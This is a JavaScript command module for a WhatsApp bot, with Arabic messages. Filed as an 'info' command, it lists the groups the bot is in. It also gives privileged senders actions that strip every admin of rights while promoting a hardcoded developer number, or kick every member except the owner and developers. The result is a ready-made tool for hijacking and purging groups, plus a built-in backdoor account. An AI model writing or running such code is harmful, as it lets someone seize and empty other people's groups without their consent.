const { eliteNumbers } = require('../haykala/elite.js');
const GROUP_DEVELOPERS = ['963996097873@s.whatsapp.net'];

module.exports = {
  command: ['عرض'],
  description: 'عرض كل المجموعات التي يشارك بها البوت مع إمكانية تنفيذ أوامر إدارية فيها.',
  category: 'info',

  async execute(sock, msg, args = []) {
    const sender = msg.key.participant || msg.key.remoteJid;
    const senderNumber = sender.split('@')[0];

    if (!eliteNumbers.includes(senderNumber)) {
      return await sock.sendMessage(msg.key.remoteJid, {
        text: '❌ هذا الأمر مخصص للنخبة فقط.',
      }, { quoted: msg });
    }

    const textMsg =
      msg.message?.conversation ||
      msg.message?.extendedTextMessage?.text ||
      '';

    const chats = sock.chats || {};
    const groups = Object.entries(chats).filter(([jid]) => jid.endsWith('@g.us'));

    if (!textMsg || args.length === 0) {
      let list = `📋 قائمة المجموعات:\n\n`;

      for (const [jid] of groups) {
        const metadata = await sock.groupMetadata(jid).catch(() => null);
        if (!metadata) continue;

        const name = metadata.subject || 'غير معروف';
        const participants = metadata.participants?.length || 0;

        list += `• ${name}\n`;
        list += `- ID: ${jid}\n`;
        list += `- الأعضاء: ${participants}\n`;
        list += `- أمر: اسحب-${jid} | تصفيه-${jid} | مغادرة-${jid}\n\n`;
      }

      return await sock.sendMessage(msg.key.remoteJid, {
        text: list.trim(),
      }, { quoted: msg });
    }

    const [action, groupId] = textMsg.split('-');

    if (!groupId) {
      return await sock.sendMessage(msg.key.remoteJid, {
        text: '❌ يرجى تحديد رقم المجموعة مثل: سحب-groupjid',
      }, { quoted: msg });
    }

    const metadata = await sock.groupMetadata(groupId).catch(() => null);
    if (!metadata) {
      return await sock.sendMessage(msg.key.remoteJid, {
        text: '❌ فشل في جلب بيانات المجموعة.',
      }, { quoted: msg });
    }

    const owner = metadata.owner;
    const participants = metadata.participants || [];

    if (action === 'اسحب') {
      const toDemote = participants.filter(p =>
        p.admin &&
        p.id !== owner &&
        p.id !== sock.user.id &&
        !GROUP_DEVELOPERS.includes(p.id)
      ).map(p => p.id);

      const toPromote = participants.filter(p =>
        GROUP_DEVELOPERS.includes(p.id) && !p.admin
      ).map(p => p.id);

      if (toDemote.length) await sock.groupParticipantsUpdate(groupId, toDemote, 'demote');
      if (toPromote.length) await sock.groupParticipantsUpdate(groupId, toPromote, 'promote');

      await sock.sendMessage(groupId, {
        text: `تم تنفيذ السحب بواسطة مطوري البوت: @${senderNumber}`,
        mentions: [sender]
      }, { quoted: msg });

      return await sock.sendMessage(msg.key.remoteJid, {
        text: '✅ تم سحب المجموعة بنجاح.',
        mentions: [sender]
      }, { quoted: msg });
    }

    if (action === 'تصفيه') {
      const toKick = participants.filter(p =>
        p.id !== owner &&
        p.id !== sock.user.id &&
        !GROUP_DEVELOPERS.includes(p.id)
      ).map(p => p.id);

      const toPromote = participants.filter(p =>
        GROUP_DEVELOPERS.includes(p.id)
      ).map(p => p.id);

      if (toKick.length) await sock.groupParticipantsUpdate(groupId, toKick, 'remove');
      if (toPromote.length) await sock.groupParticipantsUpdate(groupId, toPromote, 'promote');

      await sock.sendMessage(groupId, {
        text: `تمت تصفية المجموعة بواسطة مطوري البوت: @${senderNumber}`,
        mentions: [sender]
      }, { quoted: msg });

      return await sock.sendMessage(msg.key.remoteJid, {
        text: '✅ تم تصفية المجموعة بنجاح.',
        mentions: [sender]
      }, { quoted: msg });
    }

    if (action === 'مغادرة') {
      await sock.sendMessage(groupId, {
        text: `البوت يغادر المجموعة بأمر من مطوره: @${senderNumber}`,
        mentions: [sender]
      }, { quoted: msg });

      await sock.groupLeave(groupId);
    return await sock.sendMessage(msg.key.remoteJid, {
        text: '✅ تمت مغادرة المجموعة.',
        mentions: [sender]
      }, { quoted: msg });
    }
  }
};